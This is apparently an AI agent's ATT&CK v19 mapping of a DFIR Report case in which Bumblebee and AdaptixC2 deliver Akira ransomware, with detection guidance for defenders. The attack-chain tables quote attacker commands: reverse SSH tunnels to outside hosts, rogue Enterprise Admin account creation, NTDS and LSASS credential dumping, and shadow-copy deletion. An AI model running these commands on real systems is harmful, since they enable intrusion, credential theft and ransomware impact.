# Worked example: Bumblebee and AdaptixC2 deliver Akira

Output from the `dfir-report-analyst` agent, mapped against **Enterprise
ATT&CK v19.1** as shipped in this repository. Every ID below was resolved with
`util/attack_lookup.py` against the bundle, not from memory.

Source: The DFIR Report, ["From Bing Search to Ransomware: Bumblebee and
AdaptixC2 Deliver Akira"](https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/)
(published 2026-06-29; intrusion July 2025). The report covers two intrusions:
the primary case and a parallel one observed by Swisscom B2B CSIRT.

## What happened

An IT administrator searching Bing for "ManageEngine OpManager" was steered by
SEO poisoning to `opmanager[.]pro`, redirected to `download-center[.]online`,
and downloaded a trojanized MSI signed by "LLC Resource+" (a revoked
certificate with prior Bumblebee history). The victim copied the MSI to an
internal network share, from which an administrator executed it on the
beachhead host — a self-inflicted lateral spread before any malware ran. The
MSI dropped the real OpManager installer as a decoy alongside `consent.exe`
and a malicious `msimg32.dll`; side-loading that DLL ran the Bumblebee loader
inside a trusted Windows binary.

The loader geofenced itself against 27 CIS locales, then beaconed to DGA
domains. Five hours later it dropped `AdgNsy.exe` — a renamed Windows Address
Book binary — launched it via WMI so it spawned under `WmiPrvSE.exe`, and
injected AdaptixC2 shellcode into it. From there: hands-on-keyboard discovery,
two new domain accounts (`backup_DA`, `backup_EA`) with `backup_EA` added to
Enterprise Admins, RustDesk installed as a service for redundant access, RDP to
a domain controller, `NTDS.dit` extracted with `wbadmin.exe`, Veeam credentials
dumped from PostgreSQL and decrypted via DPAPI, and LSASS dumped on three hosts
with `lsassy`. A reverse SSH tunnel from the DC proxied RDP past the firewall
and carried ~2.5 GB of SYSVOL out. FileZilla — introduced via RDP clipboard —
exfiltrated ~77 GB over SFTP in two 4.5-hour sessions to a Ukrainian host.
Akira (`locker.exe`) landed at **~44 hours**. The actor returned on day five
via RustDesk to encrypt a child domain, running the binary 39 times.

**Total dwell before impact: ~44 hours.** Swisscom's parallel case ran the same
playbook in **9 hours**, with cloudflared for tunneling and a BYOVD attack on
endpoint security.

## Attack chain

| # | Phase | Action | ATT&CK |
|---|---|---|---|
| 1 | Resource Development | Look-alike domains ranked in Bing (`opmanager[.]pro`, `zenmap[.]pro`, `ip-scanner[.]org`) | T1608.006 SEO Poisoning; T1583.001 Domains |
| 2 | Resource Development | MSIs signed by shell-company certs ("LLC Vector", "LLC Resource+") | T1588.003 Code Signing Certificates |
| 3 | Initial Access | Victim downloads trojanized MSI from the poisoned result | T1189 Drive-by Compromise |
| 4 | Execution | MSI copied to a network share, then run by an IT admin from `explorer.exe` | T1204.002 Malicious File; T1218.007 Msiexec |
| 5 | Stealth | Signed MSI + decoy install of the real OpManager | T1553.002 Code Signing; T1036.005 Match Legitimate Resource Name or Location |
| 6 | Stealth / Execution | `consent.exe` relocated to `%TEMP%\ApplicationInstallationFolder_11` side-loads malicious `msimg32.dll` | T1574.001 DLL |
| 7 | Discovery | `GetSystemDefaultLocaleName()` checked against 27 CIS locales; exits on match | T1614.001 System Language Discovery |
| 8 | Stealth | Loader performs environment and virtualization checks | T1497 Virtualization/Sandbox Evasion |
| 9 | Command and Control | DGA domains (14-char `.org`) resolve to `188.40.187[.]145:443`, `109.205.195[.]211:443` | T1568.002 Domain Generation Algorithms; T1071.001 Web Protocols; T1573 Encrypted Channel |
| 10 | Execution | `AdgNsy.exe` (renamed `WAB.exe`) launched via WMI, spawning under `WmiPrvSE.exe` | T1047 Windows Management Instrumentation; T1036.003 Rename Legitimate Utilities |
| 11 | Stealth | AdaptixC2 shellcode reflectively injected into `AdgNsy.exe`; RWX private regions, unbacked thread entry | T1055 Process Injection |
| 12 | Command and Control | AdaptixC2 HTTP beacon to `172.96.137[.]160`, default profile | T1071.001 Web Protocols |
| 13 | Discovery | `systeminfo`, `whoami /groups`, `quser`, `nltest /dclist:`, `nltest /domain_trusts`, `ping`, `net group "domain admins" /dom`, `dir C:\programdata` | T1082, T1033, T1087.002, T1069.002, T1482, T1018, T1083 |
| 14 | Discovery | Port scan from the beacon (SMB/RDP/LDAP); later SoftPerfect `n.exe` | T1046 Network Service Discovery |
| 15 | Persistence | `net user backup_DA/backup_EA ... /add /dom` | T1136.002 Domain Account |
| 16 | Privilege Escalation | `net group "enterprise admins" backup_EA /add /dom` | T1098.007 Additional Local or Domain Groups |
| 17 | Persistence / C2 | RustDesk installed as a Windows service on two servers, run `--tray` | T1543.003 Windows Service; T1219.002 Remote Desktop Software |
| 18 | Persistence | `net user administrator P@ssw0rd!` on file and backup servers; built-in Domain Admin reactivated (`/active:yes /dom`) | T1078.002 Domain Accounts |
| 19 | Lateral Movement | RDP from beachhead to DC and backup server using `backup_EA`; nine accounts rotated | T1021.001 Remote Desktop Protocol |
| 20 | Credential Access | `wbadmin.exe start backup` staging `ntds.dit` + SYSTEM/SECURITY hives to `C:\ProgramData` | T1003.003 NTDS |
| 21 | Credential Access | `psql.exe` query on Veeam PostgreSQL, run 4× including once via WMI + encoded PowerShell; DPAPI decryption | T1555 Credentials from Password Stores; T1059.001 PowerShell |
| 22 | Credential Access | `lsassy` — `rundll32 comsvcs.dll MiniDump` across 3 hosts via SMB → WMI → scheduled task → DCOM in ~50s | T1003.001 LSASS Memory; T1021.002 SMB/Windows Admin Shares; T1053.005 Scheduled Task; T1021.003 Distributed Component Object Model |
| 23 | Discovery | SPN enumeration script → `spn.txt`; `Invoke-ShareFinder`; `Get-ADComputer`/`Get-ADUser` exports; `Export-DnsServerZone` | T1135 Network Share Discovery; T1087.002 Domain Account; T1018 Remote System Discovery |
| 24 | Collection | Automated sweep for DPAPI keys, RSA keys, Credential Manager, browser profiles, AWS/GCP/Azure creds, nine password managers, source repos, mRemoteNG configs (Event ID 5145) | T1119 Automated Collection; T1555.003, T1555.004, T1555.005; T1552.001, T1552.004; T1039 Data from Network Shared Drive |
| 25 | Command and Control | `ssh root@193.242.184[.]150 -R *:10400 -p22` from the DC, bridging local 3389 | T1572 Protocol Tunneling; T1090.002 External Proxy |
| 26 | Exfiltration | ~2.5 GB from the DC over port 22, concurrent with SYSVOL share access | T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol |
| 27 | Lateral Movement | FileZilla installer written by `explorer.exe` after `rdpclip` activity — RDP clipboard transfer | T1570 Lateral Tool Transfer; T1105 Ingress Tool Transfer |
| 28 | Exfiltration | 39.28 GB + 41.77 GB over two ~4.5h SFTP sessions to `185.174.100[.]203:22` (Ukraine, AS-COLOCROSSING), client `SSH-2.0-FileZilla_3.68.1` | T1048.002 |
| 29 | Stealth | Secure file deletion of loaders and recon logs (Sysmon 23); FileZilla uninstalled before encryption | T1070.004 File Deletion |
| 30 | Stealth | Mixed-case invocation: `CmD.eXe`, `pOWerShELl.exE` | T1027.010 Command Obfuscation |
| 31 | Impact | `locker.exe -p=G:\ -n=15` on backup server, then file server and DC with remote flags; 39 executions on the child DC | T1486 Data Encrypted for Impact |
| 32 | Impact | `powershell.exe -Command "Get-WmiObject Win32_Shadowcopy \| Remove-WmiObject"` within ~1s of each locker execution | T1490 Inhibit System Recovery |

### Swisscom variant (same campaign, different victim)

| Phase | Action | ATT&CK |
|---|---|---|
| Initial Access | `ip-scanner[.]org` impersonating Advanced IP Scanner; MSI run on a management server after UAC consent | T1189; T1204.002 |
| C2 | AdaptixC2 to `170.130.55[.]223` after 40 min dwell | T1071.001 |
| Persistence / C2 | cloudflared installed as a service by `1.ps1` (likely LLM-generated); RDP proxied, sessions appear from `::%16777216` | T1543.003; T1572; T1090.002 |
| Defense Impairment | BYOVD: `rwdrv.sys`, `hlpdrv.sys` registered as services `mgdsrv`/`KMHLPSVC`; AV-killer utilities under `C:\ProgramData\av_kill_new\` | **T1685 Disable or Modify Tools**; T1068 Exploitation for Privilege Escalation; T1543.003 |
| C2 | `ssh -p22 socat1@83.229.17[.]60 -R 5554` | T1572 |
| Impact | `wmic /node:@hosts1.txt ... service where "Name Like '%sql%'" call ChangeStartmode Disabled` and process deletion | T1489 Service Stop |
| Impact | `win.exe -n=2 netonly`, 9 hours after initial access | T1486 |

## Version traps in this report

The report is written against pre-v19 ATT&CK. Three things do not translate
directly:

1. **"Defense Evasion" is not a v19 tactic.** It was split into **Stealth**
   (`stealth`) and **Defense Impairment** (`defense-impairment`). The report's
   Defense Evasion section spans both: DLL side-loading, process injection,
   file deletion, and case obfuscation are Stealth; the BYOVD AV-killer is
   Defense Impairment.
2. **T1562 Impair Defenses and T1562.001 Disable or Modify Tools are REVOKED**,
   replaced by top-level **T1685 Disable or Modify Tools**. Any mapping of the
   BYOVD activity to T1562.001 needs updating — ATT&CK already links Akira
   (G1024) to T1685.
3. Detection guidance now lives in **Detection Strategy** (`DET####`) and
   **Analytic** (`AN####`) objects with structured log sources, not the old
   free-text `x_mitre_detection` field.

Verify with:

```bash
python3 util/attack_lookup.py validate T1562.001 T1562
```

## Tooling

| Tool | Role | ATT&CK coverage |
|---|---|---|
| Bumblebee | First-stage loader, side-loaded as `msimg32.dll` | **S1039** — 39 linked techniques |
| AdaptixC2 | Open-source post-exploitation framework; injected into `AdgNsy.exe` | **Not tracked** — map behaviors individually |
| RustDesk | Redundant remote access, installed as a service | **Not tracked** — maps to T1219.002 |
| cloudflared | Tunneling for RDP (Swisscom) | **Not tracked** — maps to T1572 |
| lsassy / Impacket | Remote LSASS dumping via 4 execution methods | Impacket is **S0357**; lsassy not tracked |
| FileZilla | SFTP client, ~77 GB exfiltration | **Not tracked** — legitimate software abused |
| SoftPerfect Network Scanner | `n.exe` internal scanning | Not tracked |
| Invoke-ShareFinder / PowerView | Share enumeration | PowerSploit is **S0194** |
| Akira | Ransomware payload, staged as `locker.exe` / `win.exe` | **S1129** (also S1194 Akira_v2, S1191 Megazord); group **G1024** |

Six of nine tools have no ATT&CK software entry. That is the practical
takeaway for anyone building coverage from this report: an IOC-driven or
software-entry-driven approach misses most of the intrusion. The behaviors are
what generalize.

### Overlap with ATT&CK's Akira profile (G1024)

Confirmed overlap: T1021.001 RDP, T1018, T1482, T1486, T1219, T1685, T1078,
T1059.001, T1036.005.

Divergence worth noting: ATT&CK's G1024 profile lists **T1133 External Remote
Services** as the initial-access pattern (compromised VPN credentials) and
**T1567.002 Exfiltration to Cloud Storage** with **T1560.001 Archive via
Utility** for exfiltration. This intrusion used neither — initial access was
SEO poisoning through an initial-access-broker loader, and exfiltration was raw
SFTP with **no compression or staging**, which the report explicitly notes.
This is consistent with Akira operating as a deployment entity fed by separate
access brokers rather than running its own intrusions end to end.

## Detection opportunities

Ranked by signal quality and by where they sit relative to the 44-hour clock.
Log sources come from the v19 Detection Strategy objects
(`attack_lookup.py technique <ID> -d`).

1. **`wbadmin.exe` targeting `ntds.dit`** (T1003.003, DET0586/AN1611). The
   command line is unambiguous — `-include:C:\windows\NTDS\ntds.dit`. Sources:
   Security 4688, Sysmon 1/11, `Microsoft-Windows-VSS`. Fires at hour ~24,
   twenty hours before encryption. **Highest-value single detection here.**
2. **`rundll32 comsvcs.dll MiniDump` against LSASS** (T1003.001,
   DET0363/AN1030). Sysmon 10 handle access `0x1F0FFF` to `lsass.exe`, Sysmon 1,
   Security 4673. The `lsassy` pattern is even more distinctive: the same host
   hit via SMB, WMI, scheduled task, and DCOM within ~50 seconds, with dumps
   written to `\Windows\Temp\` under mismatched extensions (`.sys`, `.docx`,
   `.avhdx`).
3. **`ssh.exe` with `-R` from a domain controller** (T1572, DET0538/AN1483).
   Sysmon 1 + 3/22. A DC initiating outbound SSH is close to zero-false-positive
   in a Windows estate, and here it preceded both the SYSVOL exfil and the RDP
   proxy.
4. **DLL side-loading from a user-writable path** (T1574.001, DET0201/AN0577).
   Sysmon 7 image load where a `System32`-resident DLL name loads from
   `%TEMP%` or `%APPDATA%`. The Sigma rule *System File Execution Location
   Anomaly* already caught `consent.exe` running from AppData — this fired at
   hour zero.
5. **Bulk SFTP egress** (T1048.002, DET0512/AN1413). Two sessions of ~40 GB
   each over 4.5 hours to one external host. Zeek `conn.log` byte thresholds per
   destination catch this even though the payload is encrypted and the client is
   legitimate software. The SSH client string `SSH-2.0-FileZilla_3.68.1` from a
   file server is itself an anomaly.
6. **Domain account creation followed by Enterprise Admins membership**
   (T1136.002, DET0003/AN0006). Security 4720 then 4728/4756, correlated
   within minutes and outside a change window. `backup_DA`/`backup_EA` were
   named to survive a casual audit — the timing is the signal, not the name.
7. **RustDesk or cloudflared registered as a service** (T1219.002,
   DET0259/AN0714 and T1543.003). Sysmon 11 + 3/22, plus new firewall rules.
   Watch for RustDesk's tell: Security 4624 Type 2 interactive logon from
   `127.0.0.1` followed by `RustDesk.exe --cm`.
8. **Process injection into a renamed system binary** (T1055, DET0508/AN1399).
   Sysmon 10 `ProcessAccess` where the source is a side-loaded process, plus
   Sysmon 1 with `OriginalFileName` mismatching `Image` — `AdgNsy.exe` carrying
   `OriginalFileName: WAB.EXE` is caught by that rule alone.
9. **Cmd/PowerShell spawning under `WmiPrvSE.exe`** with `-e`/`-enc`
   (T1047 + T1059.001). Used for both the Veeam dump and the AdaptixC2 launch.
10. **Shadow copy deletion via WMI** (T1490) —
    `Get-WmiObject Win32_Shadowcopy | Remove-WmiObject`. Reliable, but it fires
    one second after encryption starts. Detection value is forensic, not
    preventive.
11. **DGA burst** (T1568.002). Many NXDOMAIN responses for 14-character `.org`
    names from one host. The report ships a correlation rule for this
    (`9c4034f6-d413-49e1-b257-419775a14736`).

The chain offers at least four high-confidence detections (1-4) in the twenty
hours before encryption. This intrusion was loud; the failure mode was not
subtlety.

## Gaps and caveats

- Everything above is from the report text. The report's own ATT&CK mapping
  table was not included in what was provided, so there was nothing of theirs
  to validate — the v19 issues flagged above are predictions about that table,
  based on the tactic names used in the prose.
- The Veeam PostgreSQL dump maps cleanly to T1555 Credentials from Password
  Stores at the parent level; no sub-technique covers backup-application
  credential databases specifically.
- SPN enumeration to `spn.txt` is mapped as discovery. The report shows no
  ticket requests or cracking, so **T1558.003 Kerberoasting is not supported**
  by the evidence, even though SPN enumeration usually precedes it.
- `Export-DnsServerZone` has no clean Enterprise mapping; T1018 Remote System
  Discovery is the closest fit for internal DNS zone extraction.
- The source of the FileZilla installer is inferred from `explorer.exe` file
  creation plus adjacent `rdpclip` executions — the report says "likely", and
  the T1570 mapping inherits that uncertainty.
- Steps 7 and 8 (locale geofencing, sandbox checks) are loader capability
  confirmed by static analysis, not necessarily behavior that ran to completion
  in the victim environment.
